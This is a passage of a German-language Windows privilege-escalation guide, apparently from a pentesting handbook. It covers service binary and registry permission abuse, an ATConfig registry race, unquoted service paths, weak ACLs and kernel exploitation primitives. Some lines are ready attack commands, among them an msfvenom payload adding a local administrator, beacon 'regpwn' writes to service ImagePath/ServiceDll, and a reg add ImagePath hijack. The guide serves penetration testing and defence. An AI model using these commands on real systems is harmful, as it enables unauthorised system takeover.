2. Bestätige mit `icacls <path>`, dass die Binary beschreibbar ist.
3. Ersetze die Service-Binary durch einen Payload oder eine gültige bösartige Service-Binary.
4. Starte den Service mit `sc stop <service_name> && sc start <service_name>` neu (oder warte auf einen Neustart / Service-Trigger).

Nützliche automatisierte Prüfungen:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Wenn der Dienst einem normalen Benutzer keinen Neustart erlaubt, prüfen Sie, ob er beim Booten automatisch gestartet wird, eine Fehleraktion hat, die ihn erneut startet, oder indirekt von der Anwendung ausgelöst werden kann, die ihn verwendet.

### Änderungsberechtigungen für Dienstregistrierungsschlüssel

Sie sollten prüfen, ob Sie eine Dienstregistrierung ändern können.\
Sie können Ihre **Berechtigungen** für eine **Dienstregistrierung** wie folgt **prüfen**:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Überprüfe, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** Schreibrechte auf einen bestimmten Serviceschlüssel in der Registry haben. Ein ACL-Eintrag allein belegt keinen effektiven Zugriff: Deny-Einträge, das aktuelle Token und geerbte Berechtigungen sind ebenfalls relevant. Die Rechte für Registrierungsschlüssel sind unabhängig von den Rechten `SERVICE_CHANGE_CONFIG` und `SERVICE_START` des Serviceobjekts. Für eine Rechteausweitung sind außerdem ein verwendbares Konfigurationsfeld des Service, eine Möglichkeit, den Service auszulösen, und eine privilegiertere Serviceidentität erforderlich. Siehe Microsofts [Rechte für Registrierungsschlüssel](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) und [Referenz zu Servicezugriffsrechten](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

So änderst du den Pfad der ausgeführten Binärdatei:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry-symlink-race zum Schreiben beliebiger HKLM-Werte (ATConfig)

Einige Windows-Barrierefreiheitsfunktionen erstellen benutzerspezifische **ATConfig**-Schlüssel, die später von einem **SYSTEM**-Prozess in einen HKLM-Sitzungsschlüssel kopiert werden. Eine **Race Condition mit symbolischen Registry-Links** kann diesen privilegierten Schreibvorgang auf **einen beliebigen HKLM-Pfad** umleiten und so eine Primitive zum **Schreiben beliebiger HKLM-Werte** bereitstellen.<sup>[[18]](#references)</sup>

Wichtige Speicherorte (Beispiel: Bildschirmtastatur `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` listet installierte Barrierefreiheitsfunktionen auf.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` speichert benutzergesteuerte Konfiguration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` wird während der Anmeldung und bei Secure-Desktop-Wechseln erstellt und ist für den Benutzer beschreibbar.

Ablauf des Angriffs (CVE-2026-24291 / ATConfig):

1. Lege den **HKCU-ATConfig**-Wert fest, der von SYSTEM geschrieben werden soll.
2. Löse das Kopieren auf den Secure Desktop aus (z. B. mit **LockWorkstation**), wodurch der AT-Broker-Ablauf gestartet wird.
3. **Gewinne die Race Condition**, indem du ein **oplock** auf `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` setzt. Wenn das oplock ausgelöst wird, ersetze den **HKLM-Session-ATConfig**-Schlüssel durch einen **Registry-Link** auf ein geschütztes HKLM-Ziel.
4. SYSTEM schreibt den vom Angreifer gewählten Wert in den umgeleiteten HKLM-Pfad.

Sobald du beliebige HKLM-Werte schreiben kannst, kannst du für eine LPE Dienstkonfigurationswerte überschreiben:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/Befehlszeile)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wähle einen Dienst, den ein normaler Benutzer starten kann (z. B. **`msiserver`**), und starte ihn nach dem Schreibvorgang. **Hinweis:** Die öffentliche Exploit-Implementierung **sperrt die Workstation** als Teil der Race Condition.

Beispiel-Tools (RegPwn BOF / Standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Berechtigungen für AppendData/AddSubdirectory in der Dienstregistrierung

Wenn du diese Berechtigung für eine Registrierung hast, bedeutet das, dass **du darunter Unterschlüssel erstellen kannst**. Bei Windows-Diensten reicht das aus, um **beliebigen Code auszuführen**:


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, alle möglichen Pfade bis zu einem Leerzeichen auszuführen.

Beim Pfad _C:\Program Files\Some Folder\Service.exe_ versucht Windows beispielsweise, Folgendes auszuführen:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Liste alle nicht in Anführungszeichen gesetzten Dienstpfade auf, ausgenommen diejenigen, die zu integrierten Windows-Diensten gehören:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Sie können diese Schwachstelle mit Metasploit erkennen und ausnutzen:** `exploit/windows/local/trusted\_service\_path` Sie können manuell eine Dienst-Binärdatei mit Metasploit erstellen:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Wiederherstellungsaktionen

Windows ermöglicht es Benutzern, Aktionen festzulegen, die ausgeführt werden, wenn ein Dienst ausfällt. Diese Funktion kann so konfiguriert werden, dass sie auf eine Binärdatei verweist. Ist diese Binärdatei ersetzbar, ist möglicherweise eine Privilegieneskalation möglich. Weitere Informationen finden Sie in der [offiziellen Dokumentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Ziele für Skripts geplanter Aufgaben

Prüfen Sie bei einer aktivierten Aufgabe, die `cmd.exe /c` mit einer `.bat`- oder `.cmd`-Datei ausführt, sowohl das im **Aktionsargument** angegebene Skript als auch `cmd.exe`. Dasselbe gilt für ein explizites Dateiargument eines Interpreters, etwa PowerShell `-File`. Enthält eine geplante Batchdatei einen direkten PowerShell-Aufruf mit `-File`, prüfen Sie auch die ACL des referenzierten Skripts; Variablen, Bedingungen und Shell-Verkettungen müssen manuell nachvollzogen werden. Ein vom aufrufenden Konto beschreibbares Skript oder übergeordnetes Verzeichnis ist nur dann ein Ansatzpunkt für kontoübergreifende Ausführung, wenn sich der konfigurierte Aufgabenprinzipal vom aufrufenden Konto unterscheidet und die Aufgabe diese Aktion tatsächlich erreicht. Eine ACL, die nur das Anhängen erlaubt, kann bei Skripts relevant sein; ein früheres `exit` oder ein anderer Kontrollfluss kann angehängte Zeilen jedoch unerreichbar machen. Prüfen Sie die effektiven ACLs, den [Ausführungskontext der Aufgabe](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), das Arbeitsverzeichnis, den Trigger und die Richtlinie zur Anwendungskontrolle, bevor Sie eine Privilegieneskalation behaupten. Die Bestandsaufnahme darf das Skript weder ändern noch die Aufgabe starten.

## Benannte Streams in zugänglichen Dateien

Auf NTFS kann eine lesbare Datei einen benannten `:$DATA`-Stream enthalten, dessen Inhalt in einer gewöhnlichen Verzeichnisauflistung nicht angezeigt wird. Prüfen Sie bei einer kleinen, relevanten Auswahl zugänglicher Sicherungs- oder Konfigurationsdateien zunächst die **Namen und Größen** der Streams, bevor Sie Inhalte öffnen. Windows stellt diese über [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) und PowerShells [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) bereit. Ein Streamname, der auf ein Geheimnis hindeutet, ist lediglich ein Ansatzpunkt. Prüfen Sie den effektiven Lesezugriff auf die Datei, die Unterstützung von Streams durch das Dateisystem, ob der Stream verwendbare Anmeldedaten enthält und bei welchem Konto diese tatsächlich zur Authentifizierung verwendet werden. Vermeiden Sie bei der routinemäßigen Aufzählung rekursive Stream-Scans und die Ausgabe von Stream-Inhalten.

## Eingabedateien des Windows Driver Kit-Hilfsprogramms für geplante Aufgaben

Das optionale Windows Driver Kit enthält `StandaloneRunner.exe`, das Dateien namens `command.txt`, `reboot.rsf` und `working\rsf.rsf` eines Projekts aus seinem Ausführungsverzeichnis verwenden kann. Startet eine geplante Aufgabe oder ein Dienst dieses Hilfsprogramm mit einem privilegierten Konto, kann Schreibzugriff mit geringen Berechtigungen auf diese Eingabedateien zur Befehlsausführung im Kontext dieses Kontos führen, selbst wenn die ausführbare Datei des Hilfsprogramms geschützt ist. Stellen Sie fest, welches privilegierte Programm die Dateien verwendet und ob **beide** Begleitdateien erstellt oder geändert werden können. Das bloße Auffinden des Hilfsprogramms reicht nicht aus.

Prüfen Sie bei einer geplanten Aufgabe deren [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory)-Aktion und die ACLs der beiden Begleitdateipfade. Gibt die Aufgabe kein Arbeitsverzeichnis an, ist das Verzeichnis der ausführbaren Datei lediglich ein zu überprüfender Ansatzpunkt und kein Beleg dafür, dass die Aufgabe ihre Eingaben dort liest. Auch die Voraussetzung der Projektarbeitsdatei muss erfüllt sein. Prüfen Sie den tatsächlichen Aufgabenprinzipal, anstatt anzunehmen, dass die Aufgabe als SYSTEM ausgeführt wird.

## Anwendungen

### Installierte Anwendungen

Prüfen Sie die **Berechtigungen der Binärdateien** (möglicherweise können Sie eine davon überschreiben und Ihre Berechtigungen erweitern) und der **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk-Windows-Agent-Reparaturpfad

[CVE-2024-0670](https://checkmk.com/werk/16361) betrifft ältere Checkmk-Windows-Agents, die Befehlsdateien in `C:\Windows\Temp` schrieben und anschließend eine bereits vorhandene schreibgeschützte Datei ausführten, wenn das Ersetzen fehlschlug. Der Hersteller hat das Problem in 2.1.0p40, 2.2.0p23, 2.3.0b1 und 2.4.0b1 behoben. Prüfen Sie die vollständige installierte Patch-Version und ob der betroffene Agent-Vorgang ausgeführt werden kann; eine Angabe nur des Hauptzweigs wie `2.1` reicht nicht aus, um eine Betroffenheit festzustellen. Bei der Enumeration können Version, Dienststatus und Temp-Berechtigungen geprüft werden, ohne Dateien zu erstellen oder Agent-Befehle auszulösen.

#### Überprüfung des ADSelfService-Plus-SAML-Dienstes

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) betraf ADSelfService Plus Build 6210 und frühere Versionen; der Hersteller hat das Problem in Build 6211 behoben. Relevant ist die Schwachstelle nur, wenn SAML SSO **aktiviert ist oder war**. Ein Eintrag für das installierte Produkt oder ein Dienstpfad ist daher ein Hinweis, aber kein Nachweis für eine Schwachstelle: Bestätigen Sie den genauen Build, den Verlauf der SAML-Konfiguration, die Netzwerk-Erreichbarkeit des Dienstes und das Konto, unter dem er ausgeführt wird. Die Codeausführung über den Dienst übernimmt die Berechtigungen dieses Kontos; eine Ausführung als SYSTEM erfordert eine Instanz, die als SYSTEM läuft. Eine lesbare `OfflineBackup_*.ezip` im Backup-Verzeichnis des Produkts ist ein separater Hinweis auf ein verschlüsseltes Backup, aber kein Nachweis für verwendbare Zugangsdaten oder diese SAML-Schwachstelle. Erfassen Sie bei der routinemäßigen Enumeration den Pfad und die Zugriffsrechte, ohne die Datei zu entpacken.

#### Grenzen zwischen Jenkins-Controller und Domänenkonten

Unterscheiden Sie auf einem Windows-Jenkins-Controller zwischen der Berechtigung, einen Job zu erstellen oder zu konfigurieren, und der Berechtigung, ihn zu starten: [Jenkins dokumentiert diese als separate Rechte `Job/Create`, `Job/Configure` und `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ein konfigurierter Zeitplan oder ein Remote-Trigger kann einen weiteren Weg zum Starten eines Builds bieten; bestätigen Sie jedoch, dass dieser aktiviert ist und der Build tatsächlich ausgeführt wird. Die Ausführung erfolgt mit der Identität des Controllers oder des ausgewählten Agents, und gespeicherte Zugangsdaten sind nur verwendbar, wenn der Job auf ihren Geltungsbereich zugreifen kann. Prüfen Sie separat den Zugriff auf die Metadaten in `JENKINS_HOME`: Jenkins speichert Zugangsdatenmaterial und Verschlüsselungsschlüssel in `credentials.xml`, `secrets/hudson.util.Secret` und `secrets/master.key` ([Jenkins-Speicherung von Secrets](https://www.jenkins.io/doc/developer/security/secrets/)). Allein deren Vorhandensein gibt kein Passwort preis; prüfen Sie den **Lesezugriff auf die erforderlichen Dateien** und einen separaten Pfad zur Wiederverwendung des Kontos, ohne Secrets in einer gemeinsam einsehbaren Ausgabe anzuzeigen. Hat dieses Konto Schreibrechte auf `scriptPath` des AD-Benutzerobjekts, bestätigen Sie einen beschreibbaren Skriptpfad und einen tatsächlichen Anmelde- oder geplanten Vorgang, der als Zielbenutzer läuft, bevor Sie dies als kontoübergreifende Ausführung einstufen. Eine weitergehende Gruppensteuerung erfordert separat verifizierte effektive AD-Rechte.

#### Identität eines selbst gehosteten Azure-Pipelines-Agents

Unterscheiden Sie bei einem Azure DevOps Server- oder Azure-Pipelines-Projekt zwischen der Berechtigung, eine Pipeline **zu erstellen oder zu bearbeiten**, und der Berechtigung, sie **in die Warteschlange zu stellen** und den ausgewählten Agent-Pool zu verwenden; [Microsoft dokumentiert Pipeline-Berechtigungen](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) und [Pool-Autorisierung](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) getrennt. Wenn ein Konto mit geringeren Berechtigungen einen Skriptschritt übermitteln und diese Pipeline auf einem selbst gehosteten Windows-Agent ausführen kann, wird der Schritt als [konfiguriertes Betriebssystemkonto des Agents](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) ausgeführt. Prüfen Sie die genaue Pipeline, Einschränkungen für Branches und Ressourcen, den autorisierten Pool, den ausführbaren Job und die Dienstidentität des Agents, bevor Sie einen kontoübergreifenden oder SYSTEM-Übergang behaupten. Ein installierter Agent, eine Projektrolle oder Schreibzugriff auf ein Repository sind allein nur Hinweise; prüfen Sie Berechtigungen und lokale Dienstmetadaten, ohne während einer passiven Enumeration einen Build zu starten.

#### Microsoft Entra Connect Sync-Zugangsdaten

[Microsoft unterscheidet](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) zwischen dem **ADSync-Dienstkonto**, das den Synchronisierungsdienst ausführt und auf dessen SQL-Datenbank zugreift, und dem **AD-DS-Connector-Konto**, dessen Verzeichnisberechtigungen von den konfigurierten Synchronisierungsfunktionen abhängen. Die Zugangsdaten des Connectors werden verschlüsselt in dieser Datenbank gespeichert; das Schlüsselmaterial wird [über DPAPI unter dem ADSync-Dienstkonto geschützt](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Ein installierter Synchronisierungsdienst, eine Gruppe, deren Name auf lokale Administratorrechte hindeutet, oder alleiniger Datenbankzugriff belegt weder entschlüsselbare Zugangsdaten noch eine Rechteausweitung in der Domäne. Prüfen Sie separat die tatsächlichen Datenbank-Leserechte, den Zugriff auf das Dienstkonto und den Schlüssel, die Installations- und SQL-Struktur, die konfigurierte Connector-Identität und deren effektive AD-Berechtigungen. Bei der routinemäßigen Enumeration sollten nur Dienst- und Zugriffsmetadaten angezeigt werden, nicht die gespeicherten Secrets abgefragt oder ausgegeben werden.

#### Berechtigungen für Support-DLLs von Druckertreibern

Ein installierter Druckertreiber kann Support-DLLs unter `C:\ProgramData` speichern und sie in einem privilegierteren Druckprozess laden. Prüfen Sie die ACLs des konkreten Treiberverzeichnisses und der DLLs, einschließlich übergeordneter Verzeichnisse und Reparse Points, auch wenn die WMI-Enumeration von Druckern verweigert wird. Für das [Problem mit Ricoh-Druckertreibern CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) lautete der gemeldete Pfad `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [die ursprüngliche Offenlegung](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) beschreibt das Laden von DLLs durch `PrintIsolationHost.exe`. Eine beschreibbare ACL ist nur ein Hinweis: Prüfen Sie den effektiven Schreibzugriff nach Berücksichtigung verweigernder Einträge, ob der betreffende Treiber installiert ist und die Datei unter einer privilegierten Identität lädt, und ob der Hersteller den Installationsfehler mit einem aktualisierten Treiber oder Sicherheitsprogramm behoben hat. Leiten Sie eine Schwachstelle nicht allein aus dem Verzeichnisnamen oder der Treiberversion ab.

### Schreibberechtigungen

Prüfen Sie, ob Sie eine Konfigurationsdatei so ändern können, dass eine geschützte Datei gelesen wird, oder ob Sie eine Binärdatei ändern können, die von einem Administratorkonto ausgeführt wird (geplante Tasks).

Eine Möglichkeit, schwache Berechtigungen für Ordner und Dateien im System zu finden, ist:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++-Plugin-Autoload-Persistenz/-Ausführung

Notepad++ lädt automatisch alle Plugin-DLLs in seinen `plugins`-Unterordnern. Wenn eine beschreibbare portable Installation oder Kopie vorhanden ist, führt das Ablegen eines schädlichen Plugins bei jedem Start automatisch Code innerhalb von `notepad++.exe` aus (auch über `DllMain` und Plugin-Callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Beim Start ausführen

**Prüfe, ob du einen Registry-Eintrag oder eine Binärdatei überschreiben kannst, die von einem anderen Benutzer ausgeführt wird.**\
**Lies** die **folgende Seite**, um mehr über interessante **Autoruns-Orte zur Rechteausweitung** zu erfahren:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Treiber

Suche nach möglichen **seltsamen/verletzlichen Treibern von Drittanbietern**.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Wenn ein Treiber eine beliebige Kernel-Read/Write-Primitive bereitstellt (häufig bei schlecht implementierten IOCTL-Handlern), kannst du deine Rechte erhöhen, indem du direkt aus dem Kernel-Speicher ein SYSTEM-Token stiehlst.<sup>[[13]](#references)</sup> Die Schritt-für-Schritt-Technik findest du hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Bei Race-Condition-Bugs, bei denen der anfällige Aufruf einen vom Angreifer kontrollierten Object-Manager-Pfad öffnet, lässt sich das Zeitfenster von Mikrosekunden auf einige zehn Mikrosekunden ausdehnen, indem die Suche absichtlich verlangsamt wird (mit Komponenten maximaler Länge oder tief verschachtelten Verzeichnisketten):

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAFs in Cancel-safe Queues, Offenlegung von Paged-Pool-Daten und I/O-Ring-Pivots

Einige Windows-Kernel-LPE-Ketten lassen sich aus zwei für sich genommen schwachen Bugs zusammensetzen: einer **Lifetime-Race in einer Cancel-safe Queue**, die eine Anfrage/CBD freigibt, während das Queue-Lock noch gehalten wird, und einer durch **Lock-Freigabe vor dem Kopieren** verursachten Offenlegung, bei der während `RtlCopyToUser` eine freigegebene Paged-Pool-Allokation geleakt wird.<sup>[[29]](#references)</sup>

Hinweise zu Auditing und Exploitation:

- **Freigabe unter Lock + anschließender Abbruch**: Suche nach einem Erfolgszweig mit **Acquire -> CompleteRequest/free -> Release**, während der Abbruchpfad **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** ausführt. Wenn der Erfolgszweig `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` aufruft, bevor das CBDQ/CSQ-Lock freigegeben wird, kann ein in `NtCancelIoFileEx -> IopCsqCancelRoutine` blockierter Thread später fortfahren und einen freigegebenen `PFLT_CALLBACK_DATA` an den Remove-Callback des Treibers übergeben.
- **Reclaim des freigegebenen Queue-Objekts** mit einer gleich großen, vom Angreifer kontrollierten Paged-Pool-Allokation. `NPFS` Data Queue Entries sind nützlich, da Payload und Größe kontrollierbar sind und sich anschließend mit Pipe-Read-/Peek-Operationen untersuchen lassen. Enthält das freigegebene Objekt List-Links, überschreibe sie mit einer **zyklischen Liste gefälschter Request-Nodes im User-Speicher**, sodass der Treiber wiederholt vom Angreifer definierte Request-Strukturen verarbeitet, anstatt am ursprünglichen List-Head anzuhalten.
- **Eine vorhersagbare Schreiboperation aufwerten**: Wenn der gefälschte Request einen verschachtelten Context-Zeiger umleitet, der für Bookkeeping-Schreibvorgänge verwendet wird (Zeitstempel / QPC / refcount-nahe Felder), erhältst du möglicherweise einen Kernel-Write, bei dem die **Adresse, aber nicht der Wert kontrollierbar ist**. Ziele in diesem Fall auf das **length/size**-Feld eines gesprayten Pool-Objekts statt auf einen Code-/Datenzeiger und durchsuche anschließend den Spray, bis das beschädigte Objekt einen **Out-of-bounds-Read aus dem Paged Pool** ermöglicht.
- **Race-fähiges Offenlegungsmuster**: Jeder Syscall, der `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ausführt, ist ein vielversprechender Kandidat. Die Zuverlässigkeit steigt, wenn der Angreifer den kopierten Buffer vergrößern kann (etwa durch viele List-/Resource-Einträge, die die endgültige Allokationsgröße eines Serializers erhöhen), denn der längere Kopiervorgang vergrößert das Ersetzungsfenster, ohne den Rechner zwangsläufig zum Absturz zu bringen.
- **Refill-Ziele mit vielen Zeigern**: Die registrierten Buffer-Arrays des Windows-**I/O-Rings** eignen sich hervorragend als Offenlegungsziele, da ihre Paged-Pool-Größe vom Angreifer kontrolliert wird (`8 * regBufferCnt`) und jedes Element ein Kernel-Zeiger auf einen `_IOP_MC_BUFFER_ENTRY` ist. Leake eines dieser Arrays, ermittle das umgebende `IORING_OBJECT` und beschädige anschließend **`RegBuffers`** und **`RegBuffersCount`**, damit nachfolgende I/O-Ring-Operationen gefälschte Einträge des Angreifers verwenden und beliebige Kernel-Read/Write-Zugriffe ermöglichen. Wenn der einzige verfügbare Write ein stabiles Byte liefert (beispielsweise aus `KUSER_SHARED_DATA+0x14`), verwende **überlappende, nicht ausgerichtete Writes**, um einen User-Zeiger aus wiederholten Bytes wie `0x0101010101010101` zu erzeugen, ordne ihn mit `VirtualAlloc` zu und platziere dort das gefälschte registrierte Buffer-Array.<sup>[[30]](#references)</sup>

Nützliche Hinweise für das Debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Sobald du über den beschädigten I/O-Ring beliebige Kernel-Lese-/Schreibzugriffe erlangt hast, stiehl mit dem üblichen Workflow nach Erlangen der Primitive ein SYSTEM-Token:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives zur Speicherkorruption in Registry-Hives

Moderne Hive-Schwachstellen ermöglichen es, deterministische Layouts gezielt vorzubereiten, beschreibbare HKLM/HKU-Nachfolger auszunutzen und Metadatenkorruption ohne eigenen Treiber in Overflows im Kernel-Paged-Pool umzuwandeln. Die gesamte Angriffskette findest du hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Type Confusion im Direct-Modus von `RtlQueryRegistryValues` über vom Angreifer kontrollierte Pfade

Einige Treiber akzeptieren einen Registry-Pfad aus dem Userland, prüfen lediglich, ob es sich um einen plausiblen UTF-16-String handelt, und rufen dann `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` mit `RTL_QUERY_REGISTRY_DIRECT` und einem skalaren Wert auf dem Stack wie `int readValue` auf. Fehlt `RTL_QUERY_REGISTRY_TYPECHECK`, wird `EntryContext` anhand des **tatsächlichen** Registry-Typs interpretiert, nicht anhand des Typs, den der Entwickler erwartet hat.

Dadurch entstehen zwei nützliche Primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused Deputy / Oracle**: Über einen vom Benutzer kontrollierten absoluten `\Registry\...`-Pfad kann der Treiber vom Angreifer gewählte Schlüssel abfragen, ihre Existenz über Rückgabecodes/Logs offenlegen und manchmal Werte auslesen, auf die der Aufrufer nicht direkt zugreifen könnte.
- **Kernel-Speicherkorruption**: Ein skalares Ziel wie `&readValue` wird je nach Registry-Werttyp als `REG_QWORD`, `UNICODE_STRING` oder größenbestimmter Binärpuffer fehlinterpretiert.

Praktische Hinweise zur Ausnutzung:

- **Mitigation ab Windows 8**: Trifft die Abfrage auf einen **nicht vertrauenswürdigen Hive** mit `RTL_QUERY_REGISTRY_DIRECT`, aber ohne `RTL_QUERY_REGISTRY_TYPECHECK`, stürzen Kernel-Aufrufer mit `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ab. Um die Ausnutzbarkeit zu erhalten, suche nach **vom Angreifer beschreibbaren Schlüsseln in vertrauenswürdigen System-Hives**, statt Werte unter `HKCU` abzulegen.
- **Staging in vertrauenswürdigen Hives**: Verwende NtObjectManager, um beschreibbare Nachfolger von `\Registry\Machine` aufzulisten, und führe den Scan mit einem duplizierten **Low-Integrity**-Token erneut aus, um Schlüssel zu finden, auf die aus Sandbox-Kontexten zugegriffen werden kann:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: Ein direkter Schreibzugriff über 8 Byte in ein 4-Byte-`int` beschädigt benachbarte Stack-Daten und kann einen nahegelegenen Callback-/Funktionszeiger teilweise überschreiben.
- **`REG_SZ` / `REG_EXPAND_SZ`**: Im direct mode muss `EntryContext` auf eine `UNICODE_STRING` zeigen. Lädt der Code zunächst ein vom Angreifer kontrolliertes `REG_DWORD` in einen skalaren Wert auf dem Stack und verwendet denselben Puffer anschließend erneut für einen String-Lesezugriff, kontrolliert der Angreifer `Length`/`MaximumLength` und beeinflusst teilweise den `Buffer`-Zeiger. Dadurch entsteht ein teilweise kontrollierter Kernel-Schreibzugriff.
- **`REG_BINARY`**: Bei großen Binärdaten behandelt der direct mode den ersten `LONG` an `EntryContext` als vorzeichenbehaftete Puffergröße. Hinterlässt ein vorheriger `REG_DWORD`-Lesezugriff einen vom Angreifer kontrollierten **negativen** Wert im wiederverwendeten Skalar, kopiert die nächste `REG_BINARY`-Abfrage Angreifer-Bytes direkt über benachbarte Stack-Slots. Das ist oft der unkomplizierteste Weg, einen Callback-Zeiger vollständig zu überschreiben.

